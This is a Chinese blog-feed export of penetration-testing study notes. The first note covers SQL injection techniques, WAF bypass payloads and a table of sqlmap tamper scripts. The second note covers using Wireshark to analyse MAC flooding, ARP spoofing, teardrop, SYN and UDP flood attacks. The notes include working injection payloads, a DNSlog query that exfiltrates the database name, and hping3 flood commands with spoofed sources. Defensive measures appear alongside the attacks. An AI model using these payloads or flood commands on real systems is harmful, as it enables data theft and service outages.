title="时间盲注"></a>时间盲注</h3><ol><li>时间盲注原理：通过页面回显数据无法判断，构造语句，让程序延时执行，判断信息</li><li>时间盲注方法：if(left(user(),1)=’a’,0,sleep(3))</li></ol><h3 id="Dnslog盲注"><a href="#Dnslog盲注" class="headerlink" title="Dnslog盲注"></a>Dnslog盲注</h3><ol><li>Dnslog盲注原理：·减少盲注次数，使用Dnslog实现注入</li><li>Mysql LOAD_FILE函数可以发起请求：SELECT LOAD_FILE(CONCAT(‘\\‘,’test’,’.mysql.xxxx\abc’)) —— test.mysql.xxxxDnslog盲注方法： 利用load_file()函数发起请求，使用Dnslog接受请求，获取数据</li></ol><p>语法：select load_file(concat(‘\\‘,(select database()),’.mysql.xxxx\abc’)) （只有win系统可以，数据格式和内容有限制不能有：~@等）</p><h2 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4.宽字节注入"></a>4.宽字节注入</h2><p>宽字节注入原理：</p><p>宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS等，实际为两个字节</p><p>将两个字符作为一个字符消除转义字符</p><p>宽字节注入方法：GBK码在注入点后键入%df，然后正常注入（Ascii码大于128才到汉字范围）</p><p>黑盒测试：在可能的注入点后面加%df，进行测试</p><p>白盒测试：</p><ul><li>查看Mysql编码</li><li>是否使用了preg_replace</li><li>是否使用了addslashes</li><li>是否使用了mysql_real_escape_string</li></ul><p>宽字节防御：</p><ul><li>使用utf-8，避免宽字节注入</li><li>mysql_real_escape_string，mysql_set_charset(‘gbk’,$conn)</li><li>可以设置参数，character_set_client=binary</li></ul><h2 id="5-二次编码注入"><a href="#5-二次编码注入" class="headerlink" title="5.二次编码注入"></a>5.二次编码注入</h2><p>二次编码注入原理：urldecode()与PHP本身处理编码时配合失误</p><p>二次编码注入方法：在注入点后键入%2527，然后正常注入</p><p>黑盒测试：在可能的注入点后键入%2527，进行测试</p><p>白盒测试：是否使用了urldecode函数并且在转义方法之后</p><h2 id="6-二次注入"><a href="#6-二次注入" class="headerlink" title="6.二次注入"></a>6.二次注入</h2><p>二次注入原理：</p><ol><li>插入恶意数据</li><li>将数据插入数据库时，数据库仅对特殊字符转义，写入数据库时还原保存了原来数据，但数据是恶意内容引用恶意数据</li></ol><p>在恶意数据插入数据库后，在另一处进行操作将数据读出时，没有进行验证，执行了恶意数据，造成二次注入    二次注入方法：</p><p>二次注入防御：对外部提交数据做检查，对内部数据调用也做检查</p><p>7.WAF绕过原理</p><p>白盒绕过</p><ol><li>分析代码</li><li>绕过限制：大小写 等价替换 双写等等</li></ol><p>黑盒绕过</p><ul><li>架构层绕过WAF：<ul><li>寻找源站 —— 针对云WAF</li><li>利用同网段主机或边界漏洞 —— 绕过WAF</li></ul></li><li>资源限制角度绕过WAF：POST大body</li><li>协议层面绕过WAF的检测：<ul><li>协议未覆盖绕过WAF<ul><li>请求方式变换</li><li>Content-Type变换</li></ul></li><li>参数污染</li></ul></li><li>规则层面绕过<ul><li>SQL注释符绕过<ul><li>union/**/select</li><li>union/<em>aaaa%01bbs</em>/select</li><li>union/<em>aaaaaaaaaaaaaaaa</em>/select</li><li>内连注释：/<em>!xxx</em>/</li></ul></li><li>空白符绕过<ul><li>Mysql空白符：%09  %0A  %0B  %0D  %20  %0C  %A0  /<em>xxx</em>/</li><li>正则空白符：%09  %0A  %0B  %0D  %20</li></ul></li><li>函数分隔符号<ul><li>concat%2520()</li><li>concat/**/</li><li>concat%25c0()</li><li>concat%25a0()</li></ul></li><li>浮点数词法解析<ul><li>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0</li><li>select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0</li><li>select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0</li></ul></li><li>利用error-based进行SQL注入<ul><li>extractvalue(1,concat(0x5c,md5(3)))</li><li>updatexml(1,concat(0x5d,md(3)),1)</li><li>GeometryCollection((select<em>from(select</em>from(select@@version)f)x))</li><li>polygon((select*from(select name_const(version(),1))x))</li><li>linestring()</li><li>multipoint()</li><li>multilinestring()</li><li>multipolygon()</li></ul></li><li>MySQL特殊语法：select{x table_name}from{x information_schema.tables};</li></ul></li></ul><p>Fuzz绕过WAF</p><h2 id="8-Sqlmap脚本编写"><a href="#8-Sqlmap脚本编写" class="headerlink" title="8.Sqlmap脚本编写"></a>8.Sqlmap脚本编写</h2><p>SqlMap介绍</p><ul><li>-u url 自动对id uid等注入点进行测试<ul><li>加 -p 参数选择测试点 eg：-p id</li><li>加 * 号sqlmap在*位置加载payload</li></ul></li><li>–current-db 获取当前的库信息  –current-user 获取当前的用户信息</li><li>–dbs 所有数据库名称<ul><li>-D 数据库名 –tables 获取表</li><li>-D 数据库名 -T 表名 –columns 获取列</li><li>-D 数据库名 -T 表名 -C 列名（可以指定多列） –dump 获取值</li></ul></li><li>高级命令<ul><li>–os-shell 执行系统命令</li><li>–sql-shell 执行sql语句</li><li>–file-read 读文件</li><li>–file-write 本地文件 –file-dest 目标目录 写文件</li></ul></li></ul><p>SqlMap Tamper脚本介绍</p><p>调用：– tamper=</p><p>脚本都位于sqlmap目录下tamper文件夹中</p><p>|支持的数据库|编号|脚本名称|作用|实现方式|<br>|:—-:|:—-|:—-:|:—-|:—-:|:—-|:—-|:—-|:—-|<br>|    <br><br><br><br><br>all|1|apostrophemask.py|用utf8代替引号|1 AND ‘1’=’1<br>1 AND %EF%BC%871%EF%BC%87=%EF%BC%871|<br>|    |2|base64encode.py|用base64编码替换|1’ AND SLEEP(5)#<br>MScgQU5EIFNMRUVQKDUpIw==|<br>|    |3|multiplespaces.py|围绕SQL关键字添加多个空格|1 UNION SELECT foobar<br>1    UNION     SELECT   foobar|<br>|    |4|space2plus.py|用+替换空格|SELECT id FROM users<br>SELECT+id+FROM+users|<br>|    |5|nonrecursivereplacement.py|双重查询语句|1 UNION SELECT 2–<br>1 UNIOUNIONN SELESELECTCT 2–|<br>|    |6|space2randomblank.py|空白字符可选字符的有效集中随机选择一个代替空白字符|SELECT id FROM users<br>SELECT%0Did%0DFROM%0Ausers|<br>|    |7|unionalltounion.py|UNION ALL SELECT UNION SELECT替换|-1 UNION ALL SELECT<br>-1 UNION SELECT|<br>|    |8|securesphere.py|追加特制的字符串|1 AND 1=1<br>1 AND 1=1 and ‘0having’=’0having’|<br>|    <br><br><br><br><br><br><br><br><br>mssql|1|space2hash.py|绕过过滤。’=’ 替换空格字符，（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行|’1 AND 9227=9227’<br>‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’|<br>|    |2|equaltolike.py|like 代替等号|SELECT * FROM users WHERE id=1<br>SELECT * FROM users WHERE id LIKE 1|<br>|    |3|space2mssqlblank.py|空格替换为其它空符号|SELECT id FROM users<br>SELECT%08id%02FROM%0Fusers|<br>|    |4|space2mssqlhash.py|替换空格|1 AND 9227=9227<br>1%23%0AAND%23%0A9227=9227|<br>|    |5|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |6|percentage.py|asp允许每个字符前面添加一个%号|SELECT FIELD FROM TABLE<br>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E|<br>|    |7|sp_password.py|追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾|1 AND 9227=9227–<br>1 AND 9227=9227– sp_password|<br>|    |8|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |9|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |10|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045|<br>|    |11|space2comment.py|用’/<strong>/’代替空格|SELECT id FROM users<br>SELECT/</strong>/id/<strong>/FROM/</strong>/users|<br>|MySQL&gt;=5.1.13|1|equaltolike.py|like 代替等号|SELECT * FROM users WHERE id=1<br>SELECT * FROM users WHERE id LIKE 1|<br>|    |2|greatest.py|绕过过滤大于号 ,用GREATEST替换大于号。|1 AND A &gt; B<br>1 AND GREATEST(A,B+1)=A|<br>|    |3|apostrophenullencode.py|绕过过滤双引号，替换字符和双引号。|1 AND ‘1’=’1<br>1 AND %00%271%00%27=%00%271|<br>|    |4|ifnull2ifisnull.py|绕过对 IFNULL 过滤。<br>|IFNULL(1, 2)<br>IF(ISNULL(1),2,1)|<br>|    |5|space2mssqlhash.py|替换空格|1 AND 9227=9227<br>1%23%0AAND%23%0A9227=9227|<br>|    |6|modsecurityversioned.py|过滤空格，包含完整的查询版本注释|1 AND 2&gt;1–<br>1 /<em>!30874AND 2&gt;1</em>/–|<br>|    |7|space2mysqlblank.py|空格替换其它空白符号|SELECT id FROM users<br>SELECT%0Bid%0BFROM%A0users|<br>|    |8|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |9|modsecurityzeroversioned.py|包含了完整的查询与零版本注释|1 AND 2&gt;1–<br>1 /<em>!00000AND 2&gt;1</em>/–|<br>|    |10|space2mysqldash.py|替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）|1 AND 9227=9227<br>1–%0AAND–%0A9227=9227|<br>|    |11|bluecoat.py|代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like|SELECT id FROM users where id = 1<br>SELECT%09id FROM users where id LIKE 1|<br>|    |12|percentage.py|asp允许每个字符前面添加一个%号|SELECT FIELD FROM TABLE<br>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E|<br>|    |13|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |14|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |15|versionedkeywords.py|Encloses each nonfunction keyword with versioned MySQL comment|1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#<br>1/<em>!UNION**!ALL**!SELECT**!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS**!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#|<br>|    |16|space2comment.py|Replaces space character (‘ ‘) with comments ‘/<strong>/’|SELECT id FROM users<br>SELECT//id//FROM/</strong>/users|<br>|    |17|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′|<br>|    |18|versionedmorekeywords.py|注释绕过|1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#<br>1/<em>!UNION**!ALL**!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#|<br>|    |19|space2morehash.py|空格替换为 #号 以及更多随机字符串 换行符|1 AND 9227=9227<br>1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227|<br>|MySQL&lt;5.1|20|halfversionedmorekeywords.py|关键字前加注释|value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa<br>value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa|<br>|    |21|halfversionedmorekeywords.py|当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论|1(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”|<br>|    <br><br><br><br>Oracle|1|greatest.py|绕过过滤’&gt;’ ，GREATEST替换大于号|1 AND A &gt; B<br>1 AND GREATEST(A,B+1)=A|<br>|    |2|apostrophenullencode.py|绕过过滤双引号，替换字符和双引号|1 AND ‘1’=’1<br>1 AND %00%271%00%27=%00%271|<br>|    |3|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |4|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |5|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |6|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′|<br>|    |7|space2comment.py|用 ‘/<strong>/‘代替空格|SELECT id FROM users<br>SELECT//id//FROM/</strong>/users|<br>|    <br><br><br><br><br>PostgreSQL|1|greatest.py|绕过过滤’&gt;’ ，GREATEST替换大于号|1 AND A &gt; B<br>1 AND GREATEST(A,B+1)=A|<br>|    |2|apostrophenullencode.py|绕过过滤双引号，替换字符和双引号|1 AND ‘1’=’1<br>1 AND %00%271%00%27=%00%271|<br>|    |3|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |4|percentage.py|asp允许每个字符前面添加一个%号|SELECT FIELD FROM TABLE<br>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E|<br>|    |5|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |6|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |7|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′|<br>|    |8|space2comment.py|用’/<strong>/’代替空格|SELECT id FROM users<br>SELECT//id//FROM/</strong>/users|<br>|Access|1|appendnullbyte.py|在有效负荷结束位置加载零字节字符编码|1 AND 1=1’<br>1 AND 1=1%00|<br>|    <br>others|    |chardoubleencode.py|双url编码(不处理已编码的)|SELECT FIELD FROM%20TABLE<br>%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545|<br>|    |    |unmagicquotes.py|宽字符绕过 GPC addslashes|1′ AND 1=1<br>1%bf%27 AND 1=1–%20|<br>|    |    |randomcomments.py|用/**/分割sql关键字|INSERT<br>IN//S//ERT|</p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全牛——Wireshark网络安全分析</title>
      <link href="2020/10/22/%E5%AE%89%E5%85%A8%E7%89%9B%E2%80%94%E2%80%94WireShark%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
      <url>2020/10/22/%E5%AE%89%E5%85%A8%E7%89%9B%E2%80%94%E2%80%94WireShark%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="一、WireShark介绍和基本操作"><a href="#一、WireShark介绍和基本操作" class="headerlink" title="一、WireShark介绍和基本操作"></a>一、WireShark介绍和基本操作</h1><p>1.WireShark基础</p><p>2.WireShark操作过程</p><p>根据ip筛选快捷方式：统计—会话—作为过滤器应用</p><p>ip解析功能：视图—解析名称</p><p>解析物理地址可以将12位硬件地址的前6位解析</p><p>解析网络地址是将ip解析为域名</p><p>保存时：导出特定分组可以保存筛选后的结果</p><h1 id="二、网络安全仿真环境的构建"><a href="#二、网络安全仿真环境的构建" class="headerlink" title="二、网络安全仿真环境的构建"></a>二、网络安全仿真环境的构建</h1><p>1.网络设备的仿真工具：</p><p>GNS3：主要模拟思科设备</p><p>eNSP：模拟华为设备</p><p>2.eNSP与VMware的连接</p><ul><li>VMnet0：虚拟桥接网络的虚拟交换机，直接接入真实网络</li><li>VMnet1：虚拟仅主机模式的虚拟交换机，和NAT唯一区别不会连入外网</li><li>VMnet8：虚拟NAT网络的虚拟交换机，IP地址子网掩码网关通过DHCP分配</li></ul><p>通过eNSP的云可以将虚拟设备与外部真实网络连接</p><h1 id="三、WireShark的部署方式"><a href="#三、WireShark的部署方式" class="headerlink" title="三、WireShark的部署方式"></a>三、WireShark的部署方式</h1><p>1.远程数据包捕获：例如对服务器上数据包的捕获（拥有控制权）</p><p>在服务器上安装RPCAP，Windows系统可直接安装WinPacp，其中包含RPCAP。</p><p>rpcapd有被动和主动两种模式，被动模式客户端主动连接服务器，但是在服务器部署了防火墙而且使用了NAT技术，需要使用主动模式。常见参数如下：</p><ul><li>-b 指定监听ip，默认监听所有本地IPV4的地址</li><li>-p 指定监听端口，默认2002</li><li>-l 指定一个允许访问的地址列表文件</li><li>-n 不启用认证功能，任何主机都可访问</li><li>-d 以守护进程方式运行</li></ul><p>捕获选项<img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/DHDj0ogjBNB8Nl3f.png!thumbnail" alt="图片">在管理接口设置远程接口。</p><p>2.集线器环境</p><p>集线器将数据发送给每一台设备，设备通过设置网卡模式就能接收到别的设备数据，将网卡设置为混杂模式（广播数据包）</p><p>3.交换机环境</p><ol><li>端口镜像：拥有对交换机的控制权，交换机支持端口镜像。路由器也有端口镜像功能，配置时与交换机唯一区别交换机用port mirror命令，路由器用mirror命令</li><li>ARP欺骗：没有控制权，傻瓜交换机。中间人攻击（NITM），使用ARPSpoof或者Cain</li><li>网络分路器（TAP）：Network接口连接被监听设备，Monitor接口连接监听设备，类似于端口镜像</li></ol><p><img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/Pz9nF8FuqvI6K99r.png!thumbnail" alt="图片"></p><ol start="4"><li>本地流量捕获：抓取127.0.0.1的数据包，用RawCap软件Wireshark的loopback有时候抓不到，1.x2.x版本因为使用winpacp不能抓本地包3.x使用npcap</li><li>虚拟机流量捕获：选择对应的网卡</li></ol><h1 id="四、过滤无用的数据包"><a href="#四、过滤无用的数据包" class="headerlink" title="四、过滤无用的数据包"></a>四、过滤无用的数据包</h1><p>1.伯克利包过滤</p><p>原语（基元）：由标识符（名称或者数字）和限定符组成</p><p>伯克利包过滤限定符三种（Proto—Dir—Type）：</p><ul><li>Type：表示指代的对象，如ip地址、子网、端口等。常见的有host（表示主机名和ip地址），net（表示子网），port（表示端口）。默认为host</li><li>Dir：表示数据包传输方向，常见的有src（源地址）和dst（目的地址）。默认为“src or dst”</li><li>Proto：表示匹配的协议类型，如ether（MAC地址/物理地址）、ip、tcp、arp等</li></ul><p>伯克利包过滤也支持位操作。语法为proto[expr:size]。proto指协议，expr表示相对协议层的字节偏移量（起点），size表示操作字节数（长度）。size值可选“1、2、4”默认为1；</p><p>8位一个字节。</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/o3MSmIqcm1KQQuec.png!thumbnail" alt="图片"></p><p>源地址ip192.168.1.1转换为16进制为“0xc0a80101”可以写成：ip[12:4]=0x0a800101</p><p>2.捕获过滤器（有伯克利包过滤语法）</p><p>菜单栏“捕获”-&gt;“选项”</p><p>not除了否定，portrange端口范围</p><p>3.显示过滤器：非! not  与&amp;&amp; and 或|| or</p><ol><li>使用过滤器输入框创建</li><li><img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/KQ2DTE342JZPKmh1.png!thumbnail" alt="图片">使用过滤器表达式创建</li><li><img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/wBmvO12a9U3wDU67.png!thumbnail" alt="图片">在数据包细节面板创</li><li><img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/JDXeE0EGTGa0DLPT.png!thumbnail" alt="图片">直接右键选择应用</li></ol><h1 id="五、WireShark中的时间显示（网络为什么变慢了）"><a href="#五、WireShark中的时间显示（网络为什么变慢了）" class="headerlink" title="五、WireShark中的时间显示（网络为什么变慢了）"></a>五、WireShark中的时间显示（网络为什么变慢了）</h1><p>建立HTTP服务器的仿真网络</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://uploader.shimo.im/f/w5e1BzlQ2fXNIqM4.png!thumbnail" alt="图片"></p><p>1.客户端所在网络IP地址为192.168.1.0/24，目标网络所在网络 IP 地址为 192.168.4.0/24。</p><p>2.添加两个 Server，一个 Client，一个交换机 S3700，3 台路由器 AR1220。</p><p>3.客户端的ip地址192.168.1.10 网关192.168.1.1 域名服务器192.168.1.100</p><p>4.路由协议都设置为rip协议，左侧都为GE0/0/0接口，右侧都为GE0/0/1接口</p><p>5.服务器ip地址192.168.4.100 网关192.168.4.1</p><p>时间设置功能：</p><p>视图-&gt;时间显示格式-&gt;</p><ul><li>自上个捕获分组经过的秒数：距上一个数据包的时间（Delta time）</li><li>自上个显示分组经过的秒数：距上一个显示分组获得数包的时间（中间未捕获的数据包忽略）（Delta time displayed）</li></ul><p>编辑-&gt;首选项-&gt;</p><ul><li>Custom：自定义</li></ul><h1 id="六、使用WireShark分析链路层攻击（分析MAC地址泛洪攻击）"><a href="#六、使用WireShark分析链路层攻击（分析MAC地址泛洪攻击）" class="headerlink" title="六、使用WireShark分析链路层攻击（分析MAC地址泛洪攻击）"></a>六、使用WireShark分析链路层攻击（分析MAC地址泛洪攻击）</h1><p>1.针对交换机的常见攻击方式</p><p>交换机可以读取数据包分析硬件地址（物理地址MAC地址 命令ipconfig /all查询mac地址）</p><p>cam表：指二层交换机上运行的Cisco IOS在内存中维护的一张表，CAM表是交换机在二层转发数据要查找的表，表中有MAC地址，对应的端口号，端口所属的VLAN。是动态表为了组网方便，有数据包表内容才会变化</p><p>交换机不仅仅是转发数据包当cam表中没有目的地址mac时将数据广播出去</p><ul><li>MAC地址欺骗攻击</li><li>MAC地址泛洪攻击：cam表满后交换机只进行广播</li><li>STP操纵攻击</li><li>广播风暴攻击：因以太网广播通信消耗大量主机资源和网络资源，大量广播导致网络瘫痪</li></ul><p>2.分析MAC地址泛洪攻击</p><p>网络统计功能：统计-&gt;</p><ol><li>捕获文件属性：捕获数据包信息名称长度等</li><li>协议分级：协议出现次数统计</li><li>注：正常通信时应用层数据最多，如TCP、UDP等会话：进行设备端对端通信分析，源地址和目的地址进行分类，conversation类型可以选择其他常用的类型</li><li>端点：端点进行分析</li></ol><p>查找攻击者看cam表接口对应mac值确定</p><p>3.发起MAC地址泛洪攻击：macof可多开增加效率</p><p>4.防御MAC地址泛洪攻击：限制一个接口对应的地址数量</p><h1 id="七、使用WireShark分析中间人攻击"><a href="#七、使用WireShark分析中间人攻击" class="headerlink" title="七、使用WireShark分析中间人攻击"></a>七、使用WireShark分析中间人攻击</h1><p>中间人攻击（NITM攻击）：攻击目标是终端设备（计算机、手机等），不是交换机。每个终端设备中都有ARP缓存表，表中保存了IP地址和MAC地址的对应关系</p><p>1.ARP协议：在ARP缓存表中没有找到目的ip对应的mac地址，广播ip询问局域网内的计算机，回应一个mac地址，其他计算机保存发出计算机的ip和对应的mac地址在自己的ARP缓存表中</p><p>命令：arp -a查看所有 arp -d删除所有动态类型</p><p>数据包内容：Opcode 只有两个值1（请求）2（应答） 请求时目标硬件地址为00:00:00:00:00:00</p><p>问题：arp数据包过多三种情况：攻击者利用arp请求对网络进行扫描，计算机感染arp病毒，arp欺骗发生中间人攻击</p><p>一个硬件地址对应两个ip地址，真ip响应只有一两个数据包假的响应许多数据包</p><p>2.专家模式：停止捕获后可以使用</p><ol><li>对话（chat）： 关于正常通信工作流的基本信息（蓝色）</li><li>注意（note）：正常通信时的异常数据包（浅蓝色）</li><li>警告（warning）：不是正常通信中的异常数据包（应用层和传输层的异常响应 黄色）</li><li>错误（error）：数据包解析器的错误（红色）</li></ol><p>3.防御中间人攻击</p><ul><li>静态绑定ARP表项：arp -s ip地址 mac地址</li><li>使用DHCP Snooping 功能：DHCP监听</li><li>划分VLAN</li><li>ARP防火墙：耗费资源</li></ul><h1 id="八、使用WireShark分析泪滴攻击"><a href="#八、使用WireShark分析泪滴攻击" class="headerlink" title="八、使用WireShark分析泪滴攻击"></a>八、使用WireShark分析泪滴攻击</h1><p>1.泪滴攻击的相关理论：ip协议攻击方法主要有伪造ip地址和发送畸形数据包（泪滴攻击）</p><p>原理是向目标主机发送异常数据包碎片，使ip数据包碎片重组过程中有重合部分，导致目标系统无法对其重组，进一步导致系统崩溃停止服务</p><p>ip协议</p><ul><li>ip协议数据包的格式：版本（4位）首部长度（4位）总长度、标识符不重复（16位）、分片 片偏移分片后某片在原分组中的相对位置，以8个字节为偏移单位（16位）、生存时间数据包可通过路由器的最大值（8位）、传输层协议（8位）、源地址、目的地址</li><li>分片方式：MTU （最大传输单元）：数据包传输需要添加一个以太网帧头，包装成一个数据帧才能传输。以太网帧最小64Bytes，最大1518Bytes，以太网帧头目的地址6bytes源地址6bytes字节type域2bytes帧尾CRC校检部分4Bytes（该部分有时候被称作FCS），MTU值为1500Bytes<ul><li>ip协议中与分片相关的有标识符和分片，标识符相同来自同一数据包，分片第三位如果为1表示一个分片为0是最后一个分片，后十三位表示分片相对于原始位置的偏移，单位是8byte</li><li>ping命令-n表示个数-l表示长度</li></ul></li><li>存活时间（TTL）：不同的操作系统的默认 TTL 值是不同的<ul><li>Win7 TTL：64  LIUNX TTL：64  UNIX TTL：255  Windows 95/98 TTL：32  Windows NT/2000 TTL：128</li><li>每经过一个路由器传输TTL值减一</li></ul></li></ul><p>wireshark数据包样本下载：<a href="https://wiki.wireshark.org/SampleCaptures">https://wiki.wireshark.org/SampleCaptures</a>（teardrop.pcap）</p><p>2.着色规则</p><h1 id="九、使用WireShark分析SYN-Flooding攻击"><a href="#九、使用WireShark分析SYN-Flooding攻击" class="headerlink" title="九、使用WireShark分析SYN Flooding攻击"></a>九、使用WireShark分析SYN Flooding攻击</h1><p>1.SYN Flooding的相关理论</p><p>针对TCP协议，主要目的是占用目标所有可用的连接请求。</p><p>TCP连接：三次握手（当服务器接收到SYN请求后，返回SYN+ACK回应，进入半开状态等待客户端响应，期间会设置一个计时器等待，如果超时未收到响应会再次返回SYN+ACK回应，直到达到一定阈值才会释放连接）</p><p>客户端向服务端发送SYN包（SYN位数据为1其他位为0，序列号SN（sequence number）随机）</p><p>服务端向客户端返回SYN+ACK包（SYN和ACK位数据为1其他位数据为0，ACK（Ackonwledgment number）值是SN＋1，避免其他服务器建立连接）</p><p>客户端向服务端返回ACK包（ACK位数据为1其他位为0，将SN的值+1作为新的ACK值传出）</p><p>攻击原理：发送大量SYN请求或者伪造SYN包，使服务器资源耗尽。</p><p>2.使用Hping3发起攻击</p><p>hping3 -q -n –rand-source -S -p 80 –flood 目标IP</p><p>-q隐藏发送出去的数据包 -n显示ip地址 –rand-source随机地址 -p端口 -S设置syn位 –flood洪水攻击</p><p>3.解决方案</p><ul><li>丢弃第一个SYN数据包：丢弃第一个SYN包如果再次请求第二次接受（用户体验较差）</li><li>反向探测：向源地址发送探测数据包</li><li>代理模式：防火墙代替服务器先建立请求</li></ul><p>5.流量图：统计-&gt;流量图</p><p>4.分布式拒绝服务攻击：大量肉鸡进行请求</p><p>使用显示地理位置插件</p><h1 id="十、使用WireShark分析UDP-Flooding"><a href="#十、使用WireShark分析UDP-Flooding" class="headerlink" title="十、使用WireShark分析UDP Flooding"></a>十、使用WireShark分析UDP Flooding</h1><p>1.UDP Flooding的相关理论</p><p>针对UDP协议，主要目的是耗尽目标所在网络的带宽（UDP不需要建立连接），构建大量大体积数据包发往目标。</p><p>UDP协议：无连接的传输层协议，延迟小数据传输效率高</p><p>2.模拟UDP Flooding攻击</p><p>hping3 -q -n -a 伪造源地址 –udp -s 53 -p 68 –flood 目标IP -d 1000</p><p>-a伪造源地址（默认随机）–udp指定udp攻击 -s源端口（默认随机） -p目的端口 